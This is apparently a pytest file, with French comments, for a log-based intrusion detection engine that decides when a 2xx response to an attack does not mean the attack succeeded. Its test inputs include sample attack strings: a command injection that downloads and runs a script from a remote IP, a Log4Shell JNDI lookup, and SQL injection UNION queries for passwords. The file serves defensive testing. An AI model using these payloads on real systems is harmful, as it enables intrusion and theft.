"""
Code 2xx qui ne prouve pas un succès : la charge est seulement dans un en-tête que
l'application n'exécute pas, ou la réponse est identique à la page normale.
Ces attaques restent enregistrées mais ne sont plus « acceptées par le serveur ».
"""
import asyncio
import sqlite3

from app import config, db
from app import monitor as M
from app.detection import engine as E

CMD = "Tentative d'Injection de Commande"
SQLI = "Tentative d'Injection SQL"
LOG4J = "Tentative Log4Shell (Log4J)"


def nginx_line(path, status="200", size="102775", referer="-", ua="Mozilla/5.0", ip="203.0.113.9"):
    return f'{ip} - - [06/Nov/2026:21:25:56 +0000] "GET {path} HTTP/1.1" {status} {size} "{referer}" "{ua}"'


def alerts_for(monkeypatch, ev):
    raised = []

    async def fake_raise(fingerprint, category, severity, title, message="", source="", notify=True):
        raised.append((fingerprint, severity, notify, message))

    monkeypatch.setattr(M.alerts, "raise_alert", fake_raise)
    monkeypatch.setattr(M.S, "get", lambda key: 1000)
    ev["neutral"] = E.neutral_reason(ev)
    asyncio.run(M.Monitor()._security_alerts(ev))
    return raised


def fresh_sizes(monkeypatch):
    sizes = E.PageSizes()
    monkeypatch.setattr(E, "page_sizes", sizes)
    return sizes


# ---------------------------------------------------------------------------
# Charge dans un en-tête
# ---------------------------------------------------------------------------
def test_referer_payload_records_surface(monkeypatch):
    fresh_sizes(monkeypatch)
    ev = E.analyze(nginx_line("/", referer="http://x/cgi-bin/a?x=';cd /tmp;wget http://1.2.3.4/x.sh;sh x.sh;'"), "nginx")
    assert ev["attack_type"] == CMD
    assert ev["surface"] == "referer"
    assert "Referer" in E.neutral_reason(ev)


def test_referer_payload_with_200_is_not_emailed(monkeypatch):
    fresh_sizes(monkeypatch)
    ev = E.analyze(nginx_line("/", referer="http://x/a?x=';cd /tmp;wget http://1.2.3.4/x.sh;sh x.sh;'"), "nginx")
    raised = alerts_for(monkeypatch, ev)
    assert [(fp, sev, notify) for fp, sev, notify, _ in raised] == [(f"attack:{CMD}:203.0.113.9", "critical", False)]
    assert "Pourquoi ce n'est pas une attaque réussie" in raised[0][3]


def test_log4shell_in_user_agent_stays_accepted(monkeypatch):
    fresh_sizes(monkeypatch)
    ev = E.analyze(nginx_line("/", ua="${jndi:ldap://1.2.3.4/a}"), "nginx")
    assert ev["attack_type"] == LOG4J and ev["surface"] == "ua"
    assert E.neutral_reason(ev) == ""
    raised = alerts_for(monkeypatch, ev)
    assert raised[0][0] == f"attack-ok:{LOG4J}:203.0.113.9" and raised[0][2] is True


def test_payload_in_url_with_200_stays_accepted(monkeypatch):
    fresh_sizes(monkeypatch)
    ev = E.analyze(nginx_line("/search?q=1'%20UNION%20SELECT%20password%20FROM%20users--"), "nginx")
    assert ev["attack_type"] == SQLI and ev["surface"] == "url"
    assert E.neutral_reason(ev) == ""
    assert alerts_for(monkeypatch, ev)[0][0] == f"attack-ok:{SQLI}:203.0.113.9"


def test_refused_attack_has_no_neutral_reason(monkeypatch):
    fresh_sizes(monkeypatch)
    ev = E.analyze(nginx_line("/", status="444", size="0", referer="http://x/a?x=';cd /tmp;wget http://1.2.3.4/x.sh;'"), "nginx")
    assert E.neutral_reason(ev) == ""


# ---------------------------------------------------------------------------
# Réponse identique à la page normale
# ---------------------------------------------------------------------------
SQLI_PATH = "/pdc/?phone=1&id=1'/**/UNION/**/ALL/**/SELECT/**/NULL,NULL,NULL--"


def test_same_size_as_normal_page_is_neutral(monkeypatch):
    fresh_sizes(monkeypatch)
    assert E.analyze(nginx_line("/pdc/", size="20480"), "nginx")["attack_type"] is None  # visite normale apprise
    ev = E.analyze(nginx_line(SQLI_PATH, size="20512"), "nginx")
    assert ev["attack_type"] == SQLI
    assert "même taille" in E.neutral_reason(ev)
    assert alerts_for(monkeypatch, ev) == []  # « high » sans succès : pas d'alerte, l'événement reste enregistré


def test_different_size_stays_accepted(monkeypatch):
    fresh_sizes(monkeypatch)
    E.analyze(nginx_line("/pdc/", size="20480"), "nginx")
    ev = E.analyze(nginx_line(SQLI_PATH, size="48000"), "nginx")  # la page a changé : données renvoyées ?
    assert E.neutral_reason(ev) == ""
    assert alerts_for(monkeypatch, ev)[0][0] == f"attack-ok:{SQLI}:203.0.113.9"


def test_unknown_page_stays_accepted(monkeypatch):
    fresh_sizes(monkeypatch)
    ev = E.analyze(nginx_line(SQLI_PATH, size="20480"), "nginx")  # aucune visite normale connue
    assert E.neutral_reason(ev) == ""


def test_sizes_are_learned_per_container(monkeypatch):
    fresh_sizes(monkeypatch)
    E.analyze(nginx_line("/pdc/", size="20480"), "autre-site")
    ev = E.analyze(nginx_line(SQLI_PATH, size="20480"), "nginx")
    assert E.neutral_reason(ev) == ""


def test_attacks_are_not_learned_as_normal_pages(monkeypatch):
    fresh_sizes(monkeypatch)
    E.analyze(nginx_line(SQLI_PATH, size="20480"), "nginx")
    ev = E.analyze(nginx_line(SQLI_PATH, size="20480"), "nginx")
    assert E.neutral_reason(ev) == ""


def test_page_sizes_memory_is_bounded():
    sizes = E.PageSizes()
    for i in range(E.PageSizes.MAX_PATHS + 50):
        sizes.observe("nginx", "GET", f"/p{i}", "200", "100")
    assert len(sizes._sizes) == E.PageSizes.MAX_PATHS
    assert not sizes.matches_normal("nginx", "/p0", "100")  # les plus anciens sont oubliés
    assert sizes.matches_normal("nginx", f"/p{E.PageSizes.MAX_PATHS + 49}", "100")


# ---------------------------------------------------------------------------
# Base : colonne ajoutée aux bases existantes
# ---------------------------------------------------------------------------
def test_existing_database_gets_neutral_column(monkeypatch, tmp_path):
    path = tmp_path / "old.db"
    old = sqlite3.connect(path)
    old.execute("CREATE TABLE security_events (id INTEGER PRIMARY KEY AUTOINCREMENT, ts REAL NOT NULL,"
                " container TEXT NOT NULL DEFAULT '', ip TEXT NOT NULL DEFAULT '', method TEXT NOT NULL DEFAULT '',"
                " path TEXT NOT NULL DEFAULT '', status TEXT NOT NULL DEFAULT '', attack_type TEXT NOT NULL DEFAULT '',"
                " severity TEXT NOT NULL DEFAULT 'medium', ua TEXT NOT NULL DEFAULT '', raw TEXT NOT NULL DEFAULT '')")
    old.execute("INSERT INTO security_events (ts, path, status) VALUES (1, '/', '200')")
    old.commit()
    old.close()
    monkeypatch.setattr(config, "DB_PATH", path)
    monkeypatch.setattr(db, "_db", None)

    async def run():
        await db.init_db()
        try:
            return await db.fetchall("SELECT path, neutral FROM security_events")
        finally:
            await db.close_db()

    assert asyncio.run(run()) == [{"path": "/", "neutral": ""}]
